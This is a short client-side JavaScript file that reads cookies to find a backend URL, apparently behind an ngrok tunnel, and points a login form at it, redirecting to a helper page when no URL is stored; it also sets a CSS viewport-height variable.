document.addEventListener("DOMContentLoaded", function () {
		if (getCookie('url') && getCookie('state') === 'active') load_url_into_form();
		else callHamster();
	});

function getCookie(name) {
		const cookies = document.cookie.split('; ');
		for (let cookie of cookies) {
				let [key, val] = cookie.split('=');
				if (key === name) {
						if (val !== "") return decodeURIComponent(val);
				}
		}
	return null;
}

function callHamster() {
    const currentUrl = window.location.href;

    // Set the cookie
    const expires = new Date(Date.now() + 6e5).toUTCString();
    document.cookie = `caller=${encodeURIComponent(currentUrl)}; expires=${expires}; path=/; SameSite=Lax; Secure`;

    // Redirect to the internal page
    window.location.replace('/Pokemon/pages/hamster.html');
}

async function load_url_into_form() {
	const form = document.querySelector('form');
	if (!form) return;
	
	url = getCookie('url');
	try {
	    await fetch(url, {
		    headers: { "ngrok-skip-browser-warning": "true" }
	    });
		form.action = url + '/login'
    } catch {
        callHamster();
    }
}

// In a <script> tag or external file
function setViewportHeight() {
  const vh = window.innerHeight * 0.01;
  document.documentElement.style.setProperty('--vh', `${vh}px`);
}

// Set on load
setViewportHeight();

// Update on resize (orientation change, soft keyboard, etc.)
window.addEventListener('resize', setViewportHeight);
